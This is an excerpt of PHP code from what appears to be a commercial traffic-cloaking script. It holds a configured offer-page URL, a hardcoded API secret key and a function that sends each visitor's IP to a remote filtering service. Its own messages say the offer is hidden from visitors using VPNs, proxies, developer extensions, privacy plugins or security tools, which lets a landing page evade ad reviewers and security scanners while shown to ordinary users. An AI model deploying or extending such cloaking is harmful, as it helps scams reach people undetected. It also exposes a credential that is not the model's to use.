...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://magsh.site/page/7d544fbd3f889dcd18e5dd1ceb26850e23bdf9d1/';//PHP/HTML file or URL offer used for real users
...
$HCSET['API_SECRET_KEY'] = 'v13cc6f61037f04f4c9ea13f2e45c81a2a';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-131898977&js=false&stage='.$HCSET['stage'];
...
function self_test_request($HCSET) {
    ...
    if (empty($HCSET['STATUS']) || empty($HCSET['STATUS']['action'])) {
        ...
        if($HCSET['STATUS']['action'] == 'log') $warnings[] = '<div class="container mt-4"><div class="alert alert-warning border border-warning p-4" role="alert"><h4 class="alert-heading text-danger">You Are Using Free Trial Mode!</h4><p class="mb-3">The script runs in passive mode only. It collects data, and you can view analytics, build reports, and manually adjust your campaigns based on these insights.</p><h4 class="alert-heading text-danger">Automatic traffic management is disabled during trial!</h4><p class="mb-0">Upgrade to the Paid Plan to enable real-time automatic traffic optimization and control.</p></div></div>';
        else $notes[] = 'You may not see the offer if you are using VPN/proxy/developer_extensions/privacy_plugins/antidetect_browsers or other security tools during the setup process. Use regular browser that is not used for work purposes and local/WiFi/mobile connections to check offer page.';
    }
    return array('errors'=>$errors,'warnings'=>$warnings, 'notes'=>$notes);
}
